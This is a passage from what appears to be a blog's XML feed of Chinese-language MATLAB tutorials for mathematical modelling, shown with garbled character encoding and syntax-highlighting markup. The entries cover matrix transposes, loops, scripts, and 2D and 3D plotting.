class="token number">20</span>#äº‹å®è¯æ˜å®çŸ©é˜µ a<span class="token operator">'</span>å’Œa<span class="token operator">.'</span>æ“ä½œæ˜¯ä¸€æ ·çš„ç»“æœ     a<span class="token operator">.'</span>ans <span class="token operator">=</span>    <span class="token number">17</span>    <span class="token number">19</span>     <span class="token number">3</span>    <span class="token number">19</span>    <span class="token number">13</span>     <span class="token number">2</span>     <span class="token number">6</span>    <span class="token number">11</span>    <span class="token number">20</span>    <span class="token number">20</span>     <span class="token number">4</span>    <span class="token number">20</span>    <span class="token number">20</span>    <span class="token number">10</span>    <span class="token number">17</span>     <span class="token number">3</span>     <span class="token number">9</span>    <span class="token number">19</span>    <span class="token number">16</span>    <span class="token number">20</span></code></pre><blockquote><p>å®šä¹‰å¤æ•°çŸ©é˜µå¹¶è¿›è¡Œè½¬ç½®:</p></blockquote><pre class=" language-matlab"><code class="language-matlab">z <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">3</span><span class="token operator">+</span><span class="token number">2i</span> <span class="token number">5</span><span class="token operator">+</span><span class="token number">i</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">9</span><span class="token operator">+</span><span class="token number">i</span> <span class="token number">4</span><span class="token operator">+</span><span class="token number">5i</span><span class="token punctuation">]</span>z <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span>#z çš„å…±è½­è½¬ç½®ä¸ºï¼šz<span class="token operator">'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">-</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">-</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">-</span> <span class="token number">5.0000i</span>#z çš„éå…±è½­è½¬ç½®z<span class="token operator">.'</span>ans <span class="token operator">=</span>   <span class="token number">1.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">2.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">3.0000</span> <span class="token operator">+</span> <span class="token number">2.0000i</span>   <span class="token number">9.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">5.0000</span> <span class="token operator">+</span> <span class="token number">1.0000i</span>   <span class="token number">4.0000</span> <span class="token operator">+</span> <span class="token number">5.0000i</span></code></pre><h2 id="çŸ©é˜µçš„ä¹˜ç§¯"><a href="#çŸ©é˜µçš„ä¹˜ç§¯" class="headerlink" title="çŸ©é˜µçš„ä¹˜ç§¯"></a>çŸ©é˜µçš„ä¹˜ç§¯</h2><blockquote><p>â€‹    ä¹‹å‰å­¦ä¹ çº¿æ€§ä»£æ•°çš„æ—¶å€™ï¼Œè®¡ç®—çŸ©é˜µçš„ä¹˜ç§¯éƒ½æ˜¯æŒ‰å…¬å¼æ¥ç®—ï¼Œç°åœ¨å¯ä»¥é€šè¿‡matlab forå¾ªç¯æ¥å®ç°è¿™ä¸ªè®¡ç®—ï¼š</p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>m <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> n <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>m     <span class="token keyword">for</span> <span class="token number">j</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>n        <span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">A</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token operator">:</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">B</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">end</span><span class="token keyword">end</span></code></pre><blockquote><p>â€‹    æŒ‰çŸ©é˜µä¹˜æ³•è§„åˆ™ï¼ŒçŸ©é˜µå¯ä»¥åœ¨å…¶å³ä¾§ä¹˜ä»¥åˆ—å‘é‡ï¼Œåœ¨å·¦ä¾§ä¹˜ä»¥è¡Œå‘é‡ã€‚</p></blockquote><blockquote><p>â€‹    æ¥ä¸‹æ¥ç»“åˆå…·ä½“æ•°å­¦å®ä¾‹ï¼Œæ¥è¿›è¡Œæ›´æ·±å…¥çš„ç»¼åˆæ€§å­¦ä¹ ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ¨¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°å­¦å»ºæ¨¡-day4</title>
      <link href="/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/"/>
      <url>/2018/10/09/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day4/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="æ•°å­¦å»ºæ¨¡-day4-matlabç¼–ç¨‹å’Œè„šæœ¬"><a href="#æ•°å­¦å»ºæ¨¡-day4-matlabç¼–ç¨‹å’Œè„šæœ¬" class="headerlink" title="æ•°å­¦å»ºæ¨¡_day4 - matlabç¼–ç¨‹å’Œè„šæœ¬"></a>æ•°å­¦å»ºæ¨¡_day4 - matlabç¼–ç¨‹å’Œè„šæœ¬</h1><h2 id="åˆ›å»ºä¸è¿è¡Œè„šæœ¬"><a href="#åˆ›å»ºä¸è¿è¡Œè„šæœ¬" class="headerlink" title="åˆ›å»ºä¸è¿è¡Œè„šæœ¬"></a>åˆ›å»ºä¸è¿è¡Œè„šæœ¬</h2><blockquote><p>â€‹    <em>è„šæœ¬</em>æ˜¯æœ€ç®€å•çš„ä¸€ç§ MATLABÂ® ç¨‹åºã€‚è„šæœ¬æ˜¯ä¸€ä¸ªåŒ…å«å¤šè¡Œè¿ç»­ MATLAB å‘½ä»¤å’Œå‡½æ•°è°ƒç”¨çš„æ‰©å±•åä¸º <code>.m</code> çš„æ–‡ä»¶ã€‚åœ¨å‘½ä»¤è¡Œä¸­é”®å…¥è„šæœ¬åç§°å³å¯è¿è¡Œè¯¥è„šæœ¬ã€‚ </p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; è¦åˆ›å»ºè„šæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ <code>edit &quot;filename&quot;</code></p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">% è¿™ä¼šæ‰“å¼€ä¸€ä¸ªåä¸º "filename".m çš„ç©ºç™½æ–‡ä»¶ã€‚è¾“å…¥ä¸€äº›ç»˜åˆ¶éšæœºæ•°æ®çš„å‘é‡çš„ä»£ç ï¼š</span>n <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>r <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">plot</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment" spellcheck="true">% mean å‡½æ•°æ±‚å‡å€¼ï¼Œå¯¹ç”Ÿæˆçš„50ä¸ªå€¼æ±‚å¹³å‡</span><span class="token comment" spellcheck="true">% mean(r,1)è¡¨ç¤ºå¯¹æ¯åˆ—æ±‚å¹³å‡</span><span class="token comment" spellcheck="true">% mean(r,2)è¡¨ç¤ºå¯¹æ¯è¡Œæ±‚å¹³å‡</span><span class="token comment" spellcheck="true">% Draw a line from (0,m) to (n,m)</span>m <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% hold on æ˜¯å½“å‰è½´åŠå›¾åƒä¿æŒè€Œä¸è¢«åˆ·æ–°ï¼Œå‡†å¤‡æ¥å—æ­¤åå°†ç»˜åˆ¶çš„å›¾å½¢ï¼Œå¤šå›¾å…±å­˜</span>hold on<span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span>n<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>m<span class="token punctuation">,</span>m<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">% hold off æ˜¯å½“å‰è½´åŠå›¾åƒä¸å†å…·å¤‡è¢«åˆ·æ–°çš„æ€§è´¨ï¼Œæ–°å›¾å‡ºç°æ—¶ï¼Œå–æ¶ˆåŸå›¾ã€‚å³ï¼Œå…³é—­å›¾å½¢ä¿æŒåŠŸèƒ½</span>hold off<span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'Mean of Random Uniform Data'</span><span class="token punctuation">)</span></code></pre><blockquote><p>æˆå“å›¾å¦‚ä¸‹ï¼š</p></blockquote><div align="center"><br><br><img src="https://i.loli.net/2018/10/10/5bbdfdf74ac32.png" alt=""><br><br></div><blockquote><p>ä¿å­˜æ–‡ä»¶åå¯ä»¥é€šè¿‡å³é”®è¿è¡Œï¼Œä¹Ÿå¯ç›´æ¥è¾“å…¥æ–‡ä»¶åè¿è¡Œã€‚</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0157d413b.png" alt=""><br><br></div><h2 id="for-å¾ªç¯"><a href="#for-å¾ªç¯" class="headerlink" title="for å¾ªç¯"></a>for å¾ªç¯</h2><blockquote><p>é€šè¿‡ä¸€æ®µä»£ç æ¥ç›´æ¥çœ‹çœ‹matlabçš„forå¾ªç¯æœ‰ä»€ä¹ˆä¸ä¸€æ ·ï¼š</p></blockquote><pre class=" language-matlab"><code class="language-matlab">nsamples <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>npoints <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">% matlab çš„ forå¾ªç¯æ˜¯ for i=n:m çš„å½¢å¼ï¼ŒèŒƒå›´ä¸ºnåˆ°mï¼Œéœ€è¦ç”¨endå…³é”®è¯è¡¨ç¤ºç»“æŸ</span><span class="token keyword">for</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token operator">:</span>nsamples   iterationString <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Iteration #'</span><span class="token punctuation">,</span><span class="token function">int2str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">%dispç±»ä¼¼printf ç”¨äºæ‰“å°è¯­å¥</span>   <span class="token function">disp</span><span class="token punctuation">(</span>iterationString<span class="token punctuation">)</span>   currentData <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span>npoints<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">sampleMean</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>currentData<span class="token punctuation">)</span><span class="token keyword">end</span>overallMean <span class="token operator">=</span> <span class="token function">mean</span><span class="token punctuation">(</span>sampleMean<span class="token punctuation">)</span></code></pre><blockquote><p>æ•ˆæœå›¾å¦‚ä¸‹ï¼š</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe048ca9c1b.png" alt=""></div><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šè„šæœ¬ä½ç½®</p><blockquote><p>MATLAB åœ¨ç‰¹å®šä½ç½®ä¸­æŸ¥æ‰¾è„šæœ¬åŠå…¶ä»–æ–‡ä»¶ã€‚è¦è¿è¡Œè„šæœ¬ï¼Œè¯¥æ–‡ä»¶å¿…é¡»ä½äºå½“å‰æ–‡ä»¶å¤¹æˆ–<em>æœç´¢è·¯å¾„</em>ä¸­çš„æŸä¸ªæ–‡ä»¶å¤¹å†…ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒMATLAB å®‰è£…ç¨‹åºåˆ›å»ºçš„ <code>MATLAB</code> æ–‡ä»¶å¤¹ä½äºæ­¤æœç´¢è·¯å¾„ä¸­ã€‚å¦‚æœè¦å°†ç¨‹åºå­˜å‚¨åœ¨å…¶ä»–æ–‡ä»¶å¤¹ï¼Œæˆ–è€…è¦è¿è¡Œå…¶ä»–æ–‡ä»¶å¤¹ä¸­çš„ç¨‹åºï¼Œè¯·å°†å…¶æ·»åŠ åˆ°æ­¤æœç´¢è·¯å¾„ã€‚åœ¨å½“å‰æ–‡ä»¶å¤¹æµè§ˆå™¨ä¸­é€‰ä¸­ç›¸åº”çš„æ–‡ä»¶å¤¹ï¼Œå³é”®ç‚¹å‡»ï¼Œç„¶åé€‰æ‹©<strong>æ·»åŠ åˆ°è·¯å¾„</strong>ã€‚</p></blockquote></blockquote><h2 id="ç”¨å‡½æ•°ç”ŸæˆçŸ©é˜µ"><a href="#ç”¨å‡½æ•°ç”ŸæˆçŸ©é˜µ" class="headerlink" title="ç”¨å‡½æ•°ç”ŸæˆçŸ©é˜µ"></a>ç”¨å‡½æ•°ç”ŸæˆçŸ©é˜µ</h2><table><thead><tr><th style="text-align:left">å‡½æ•°</th><th>ç‰¹å¾</th></tr></thead><tbody><tr><td style="text-align:left">ones</td><td>å…¨éƒ¨ä¸º1</td></tr><tr><td style="text-align:left">rand</td><td>å‡åŒ€åˆ†å¸ƒçš„éšæœºå…ƒç´ </td></tr><tr><td style="text-align:left">randn</td><td>æ­£æ€åˆ†å¸ƒçš„éšæœºå…ƒç´ </td></tr><tr><td style="text-align:left">zeros</td><td>å…¨éƒ¨ä¸º0</td></tr><tr><td style="text-align:left">magic</td><td>åˆ›å»ºå‡ ä¹ä»»æ„å¤§å°çš„å¹»æ–¹çŸ©é˜µ</td></tr></tbody></table><h2 id="æŸ¥çœ‹å¸®åŠ©"><a href="#æŸ¥çœ‹å¸®åŠ©" class="headerlink" title="æŸ¥çœ‹å¸®åŠ©"></a>æŸ¥çœ‹å¸®åŠ©</h2><blockquote><p>æ‰€æœ‰ MATLABå‡½æ•°éƒ½æœ‰è¾…åŠ©æ–‡æ¡£ï¼Œè¿™äº›æ–‡æ¡£åŒ…å«ä¸€äº›ç¤ºä¾‹ï¼Œå¹¶ä»‹ç»å‡½æ•°è¾“å…¥ã€è¾“å‡ºå’Œè°ƒç”¨è¯­æ³•ã€‚ä»å‘½ä»¤è¡Œè®¿é—®æ­¤ä¿¡æ¯æœ‰å¤šç§æ–¹æ³•ï¼Œå¦‚ä¸‹å›¾ï¼š</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/10/5bbe0593a6722.png" alt=""></div><blockquote><p>ä»Šæ—¥åˆ°æ­¤ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ•°å­¦å»ºæ¨¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ•°æ¨¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>æ•°å­¦å»ºæ¨¡-day3</title>
      <link href="/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/"/>
      <url>/2018/10/07/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day3/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="æ•°å­¦å»ºæ¨¡-day3-matlab-åŸºæœ¬ç”¨æ³•"><a href="#æ•°å­¦å»ºæ¨¡-day3-matlab-åŸºæœ¬ç”¨æ³•" class="headerlink" title="æ•°å­¦å»ºæ¨¡_day3 - matlab åŸºæœ¬ç”¨æ³•"></a>æ•°å­¦å»ºæ¨¡_day3 - matlab åŸºæœ¬ç”¨æ³•</h1><p>&nbsp; &nbsp; &nbsp; &nbsp; day3 ç»§ç»­ day2çš„ matlab åŸºæœ¬ç”¨æ³•å­¦ä¹ ï¼Œä»Šå¤©å­¦ä¹ æ•°å­¦æ¨¡å‹ç»˜å›¾ï¼Œmatlabçš„ç»˜å›¾åŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå„ç§åŠŸèƒ½å¦‚ä¸‹å›¾ã€‚</p><p><img src="https://i.loli.net/2018/10/08/5bbaf8f1ec8e8.png" alt=""></p><h2 id="å…­-æ ¹æ®æ¡ä»¶æ„å»ºäºŒç»´å›¾å’Œä¸‰ç»´å›¾åƒ"><a href="#å…­-æ ¹æ®æ¡ä»¶æ„å»ºäºŒç»´å›¾å’Œä¸‰ç»´å›¾åƒ" class="headerlink" title="å…­. æ ¹æ®æ¡ä»¶æ„å»ºäºŒç»´å›¾å’Œä¸‰ç»´å›¾åƒ"></a>å…­. æ ¹æ®æ¡ä»¶æ„å»ºäºŒç»´å›¾å’Œä¸‰ç»´å›¾åƒ</h2><h3 id="plot-å‡½æ•°-â€“-äºŒç»´"><a href="#plot-å‡½æ•°-â€“-äºŒç»´" class="headerlink" title="plot å‡½æ•° â€“ äºŒç»´"></a>plot å‡½æ•° â€“ äºŒç»´</h3><p> &nbsp; &nbsp; &nbsp; åˆ›å»ºäºŒç»´çº¿å›¾é¦–å…ˆéœ€è¦æ„å»ºä¸€ä¸ªäºŒç»´çš„å‡½æ•°ï¼Œæ¯”å¦‚å¸¸è§çš„ y = sin(x)ï¼Œy = 2*xï¼Œy = 2^xã€‚</p><p> &nbsp; &nbsp; &nbsp; å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç å®šä¹‰y = sin(x)å‡½æ•°:</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">100</span><span class="token punctuation">;</span>     <span class="token operator">/</span><span class="token operator">/</span>åˆ›å»ºä¸€ä¸ª<span class="token operator">-</span><span class="token number">100</span>åˆ°<span class="token number">100</span>æ­¥é•¿ä¸º<span class="token number">10</span>çš„ä¸€ç»´æ•°ç»„ç”¨æ¥ä½œä¸ºXy <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">/</span><span class="token operator">/</span>æ„æˆå‡½æ•° y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></code></pre><p><code>æˆå“å›¾å¦‚ä¸‹</code>ï¼š</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae75ed9328.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; å› ä¸ºæ­¥é•¿çš„å…³ç³»é€ æˆäº†è¿™å¼ å›¾ç‰‡çš„ç‹°ç‹ï¼Œä¸è¿‡æ²¡å…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥æ”¹ä¸€ä¸‹xçš„èŒƒå›´ï¼š</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">100</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span>æ”¹æˆå•ä½åœ†èŒƒå›´y <span class="token operator">=</span> <span class="token function">sin</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span></code></pre><p><code>æˆå“å›¾å¦‚ä¸‹</code>ï¼š</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbae85f7aa9f.png" alt=""><br><br></div><h3 id="surf-å’Œ-mesh-å‡½æ•°-â€“-ä¸‰ç»´"><a href="#surf-å’Œ-mesh-å‡½æ•°-â€“-ä¸‰ç»´" class="headerlink" title="surf å’Œ mesh å‡½æ•° â€“ ä¸‰ç»´"></a>surf å’Œ mesh å‡½æ•° â€“ ä¸‰ç»´</h3><p> &nbsp; &nbsp; &nbsp; ä¸‰ç»´å›¾é€šå¸¸æ˜¾ç¤ºä¸€ä¸ªç”±å¸¦ä¸¤ä¸ªå˜é‡çš„å‡½æ•°ï¼ˆå³ <em>z = f (x,y</em>)ï¼‰å®šä¹‰çš„æ›²é¢å›¾ã€‚ surf å‡½æ•°åŠå…¶ä¼´éšå‡½æ•° mesh ä»¥ä¸‰ç»´å½¢å¼æ˜¾ç¤ºæ›²é¢å›¾ã€‚surf ä½¿ç”¨é¢œè‰²æ˜¾ç¤ºæ›²é¢å›¾çš„è¿æ¥çº¿å’Œé¢ã€‚mesh ç”Ÿæˆä»…ä»¥é¢œè‰²æ ‡è®°è¿æ¥å®šä¹‰ç‚¹çš„çº¿æ¡çš„çº¿æ¡†æ›²é¢å›¾ã€‚</p><p> &nbsp; &nbsp; &nbsp; ä¾‹å¦‚åœ¨ä¸‰ç»´åæ ‡ç³»ä¸­ï¼Œæ„å»ºä¸€ä¸ª Z=1ï¼Œ-1&lt;x&lt;1ï¼Œ-1&lt;y&lt;1ï¼Œçš„å¹³é¢ï¼Œæˆ‘ä»¬è¦è¾“å…¥ä»¥ä¸‹ä»£ç ï¼š</p><pre class=" language-matlab"><code class="language-matlab">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>y <span class="token operator">=</span> x<span class="token punctuation">;</span>z <span class="token operator">=</span> <span class="token function">ones</span><span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mesh</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>æˆå“å›¾å¦‚ä¸‹</code>ï¼š</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf6e837e65.png" alt=""></div><p> &nbsp; &nbsp; &nbsp; expå‡½æ•°ï¼Œä¾‹å¦‚exp(5)ä»£è¡¨çš„æ˜¯e^5ã€‚è¦è®¡ç®— <em>z</em>ï¼Œè¯·é¦–å…ˆä½¿ç”¨ <code>meshgrid</code> åœ¨å°†è¦åˆ›å»ºçš„ä¸‰ç»´å‡½æ•°çš„åŸŸä¸­åˆ›å»ºä¸€ç»„ (<em>x,y</em>) ç‚¹ã€‚ ï¼š</p><pre class=" language-matlab"><code class="language-matlab"><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">meshgrid</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">.</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>åˆ›å»º<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>ç‚¹Z <span class="token operator">=</span> X <span class="token operator">.*</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>X<span class="token operator">.^</span><span class="token number">2</span> <span class="token operator">-</span> Y<span class="token operator">.^</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">/</span>å¾—åˆ°Z<span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span>ï¼›                <span class="token operator">/</span><span class="token operator">/</span>ç”»å›¾</code></pre><p><code>æˆå“å›¾å¦‚ä¸‹</code>ï¼š</p><div align="center"><img src="https://i.loli.net/2018/10/08/5bbaf9b2535a5.png" alt=""></div><h3 id="cylinder-å’Œ-subplot-å‡½æ•°"><a href="#cylinder-å’Œ-subplot-å‡½æ•°" class="headerlink" title="cylinder å’Œ subplot å‡½æ•°"></a>cylinder å’Œ subplot å‡½æ•°</h3><p> &nbsp; &nbsp; &nbsp; cylinderé€šå¸¸ç”¨äºç”Ÿæˆåœ†æŸ±æ¨¡å‹å¹¶è¿”å›xï¼Œyï¼Œzåæ ‡å€¼ï¼Œsubploté€šå¸¸ç”¨äºåˆ†å‰²çª—å£ç”¨ä»¥æ˜¾ç¤ºä¸åŒçš„å›¾å½¢ã€‚</p><pre class=" language-matlab"><code class="language-matlab">Matlab cylinder å‡½æ•°ï¼šã€€ã€€<span class="token number">1</span>ã€cylinderå‡½æ•°åŠŸèƒ½è¯´æ˜ï¼šç»˜åˆ¶ä¸‰ç»´åœ†æŸ±å›¾ã€‚ã€€ã€€<span class="token number">2</span>ã€cylinderå‡½æ•°ç”¨æ³•è¯´æ˜ï¼šã€€ã€€ï¼ˆ<span class="token number">1</span>ï¼‰<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span>cylinder å‡½æ•°è¿”å›ä¸€åŠå¾„å’Œé«˜åº¦éƒ½ä¸º<span class="token number">1</span>çš„åœ†æŸ±ä½“xï¼Œyï¼Œzè½´çš„åæ ‡å€¼ï¼Œåœ†æŸ±ä½“æ²¿å…¶å‘¨é•¿æœ‰<span class="token number">20</span>ä¸ªç­‰è·åˆ†å¸ƒçš„ç‚¹ï¼›ã€€ã€€ï¼ˆ<span class="token number">2</span>ï¼‰<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> å‡½æ•°ä¸€ä¸ªåŠå¾„ä¸ºrã€é«˜åº¦ä¸º<span class="token number">1</span>çš„åœ†æŸ±ä½“çš„xï¼Œyï¼Œzè½´çš„åæ ‡å€¼ï¼Œåœ†æŸ±ä½“æ²¿å…¶å‘¨é•¿æœ‰<span class="token number">20</span>ä¸ªç­‰è·åˆ†å¸ƒçš„ç‚¹ï¼›ã€€ã€€ï¼ˆ<span class="token number">3</span>ï¼‰<span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">cylinder</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span>n<span class="token punctuation">)</span> å‡½æ•°ä¸€ä¸ªåŠå¾„ä¸ºrã€é«˜åº¦ä¸º<span class="token number">1</span>çš„åœ†æŸ±ä½“çš„xï¼Œyï¼Œzè½´çš„åæ ‡å€¼ï¼Œåœ†æŸ±ä½“æ²¿å…¶å‘¨é•¿æœ‰nä¸ªç­‰è·åˆ†å¸ƒçš„ç‚¹ï¼›ã€€ã€€ï¼ˆ<span class="token number">4</span>ï¼‰<span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token punctuation">...</span><span class="token punctuation">)</span> å‡½æ•°åªç»˜åˆ¶åœ†æŸ±ï¼Œæ²¡æœ‰ä»»ä½•çš„è¾“å‡ºå‚é‡ã€‚å…¶ä»–å‚é‡åŠç»“æœåŒä¸Šã€‚</code></pre><p> &nbsp; &nbsp; &nbsp; ç”¨ä¸€ä¸ªä¾‹å­æ¥å±•ç¤ºä¸€ä¸‹cylinderå’Œsubplotçš„ç”¨æ³•ï¼š</p><pre class=" language-matlab"><code class="language-matlab">t <span class="token operator">=</span> <span class="token number">0</span><span class="token operator">:</span><span class="token keyword">pi</span><span class="token operator">/</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">pi</span><span class="token punctuation">;</span><span class="token punctuation">[</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cylinder</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">surf</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span>Y<span class="token punctuation">,</span>Z<span class="token punctuation">)</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mesh</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'X'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span 